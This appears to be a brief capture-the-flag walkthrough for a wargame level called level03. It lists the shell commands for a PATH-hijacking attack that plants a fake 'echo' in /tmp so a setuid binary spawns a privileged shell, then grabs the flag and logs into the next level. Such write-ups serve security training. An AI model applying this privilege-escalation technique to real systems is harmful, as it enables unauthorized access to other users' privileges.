ssh:
- `echo '/bin/sh' > /tmp/echo`
- `chmod +x /tmp/echo`
- `export PATH=/tmp:$PATH`
- `./level03` gives us a subshell with the privileges of level03 (created by flag03)

subshell:
- `getflag`, copy the flag
- `exit`

ssh:
- `su level04`, paste the flag as the password